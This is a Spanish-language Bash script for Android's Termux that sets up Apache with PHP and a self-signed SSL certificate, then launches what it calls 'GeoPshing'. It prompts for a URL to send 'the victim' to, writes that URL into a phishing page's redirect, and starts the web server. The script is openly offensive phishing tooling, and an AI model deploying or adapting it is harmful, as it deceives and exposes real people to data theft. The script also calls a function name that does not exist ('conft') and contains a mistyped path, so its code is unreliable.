#!/bin/bash
conf() {
    echo "[!] configurando apache..."
    local conf_file="/data/data/com.termux/files/usr/etc/apache2/httpd.conf"
    if [ -f "$conf_file" ]; then
        if grep -q "LoadModule php7_module /data/data/com.termux/files/usr/libexec/apache2/libphp.so" "$conf_file"; then
            echo "[*] La configuracion de la libreria de PHP ya esta en apache2..."
        else
            echo "[!] Agregando configuracion de la libreria de apache2...."
            sed -i '68a\\n' "$conf_file"
            tee -a "$conf_file" > /dev/null <<EOT #agrega la siguientes lineas en le programa
    LoadModule php7_module /data/data/com.termux/files/usr/libexec/apache2/libphp.so
    <FilesMatch \.php$>
    SetHandler application/x-httpd-php
    </FilesMatch>
EOT
        sed -i ' s/DirectoryIndex index.html/DirectoryIndex index.php/g' $conf_file
        mv index.php /data/data/com.termux/files/usr/share/apache2/default-site/htdocs #mueve el index.php a la otra ruta de apache2
        sed -i '67 s/^#//' $conf_file  #coloca el numero de la linea para descomentar

        sed -i '/LoadModule mpm_worker_module libexec/apache2/mod_mpm_worker.so/ s/^/#/' $conf_file #linea a comentar
        fi
    else
        echo "[x] el archivo de apache2 no se encontro...."
    fi
}

inspec() {
    echo "[*] creando un certificado ssl autofirmado..."
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key -out /etc/ssl/certs/apache-selfsigned.crt
    clear
    sleep 1
    local config_file="/data/data/com.termux/file/usr/etc/apache2/extra/httpd-ssl.conf"  # Ruta al archivo de configuración SSL
    # Verifica si el archivo de configuración existe
    if [ -f "$config_file" ]; then
        # Verifica si la configuración SSL ya está presente en el archivo
        if grep -q "<VirtualHost _default_:8443>" "$config_file"; then
            clear
            echo "[*] La configuración SSL ya está presente en $config_file..."
        else
            clear
            echo "[+] Agregando configuración SSL a $config_file..."
            # Agrega la configuración SSL al archivo
            tee -a "$config_file" > /dev/null <<EOT
    <VirtualHost _default_:8443>
        ServerAdmin webmaster@localhost
        SSLEngine on
        SSLCertificateFile /etc/ssl/certs/apache-selfsigned.crt
        SSLCertificateKeyFile /etc/ssl/private/apache-selfsigned.key
    </VirtualHost>
EOT
            echo "[+] Configuración SSL agregada correctamente."
        fi
    else
        echo "[!] Error: El archivo de configuración $config_file no existe."
    fi
}

auto() {
    echo "[+] Comenzando el script..."
    if [ $? -eq 0 ]; then
        # Solicita al usuario ingresar una URL para redirigir
        read -p "[+] Ingresa una URL para redirigir a la víctima: " redirect_url

        # Actualiza la página de phishing con la URL de redirección
        sed -i "s#window.location.href = 'https://youtu.be/hbGiNEjqYL0?si=NMrJpgZefsG8agAd';#window.location.href = '$redirect_url';#g" Index.html
        
        #iniciar el servidor Apache2
        apachectl start
    else
        echo "[!] Error al Iniciar servidor....."
    fi
}

while true; do
    clear
    # Mostrar el menú
    echo "[*] Menú:"
    echo "1. Comenzar GeoPshing"
    echo "2. Salir"

    # Solicitar la entrada del usuario
    read -p "Seleccione una opción: " opcion

    # Evaluar la opción seleccionada
    case $opcion in
        1)
            echo "[+] Realizando GeoPshing..."
            sleep 1
            clear
            # Habilita el módulo SSL y realiza la configuración SSL
            a2enmod ssl
            if [ $? -eq 0 ]; then
                inspec
                sleep 1
                conft
                auto
            else
                echo "[x] Hubo un error al habilitar el módulo SSL."
            fi
            ;;
        2)
            echo "Saliendo del programa. ¡Hasta luego!"
            exit 0
            ;;
        *)
            echo "Opción no válida. Por favor, seleccione una opción válida."
            ;;
    esac
done
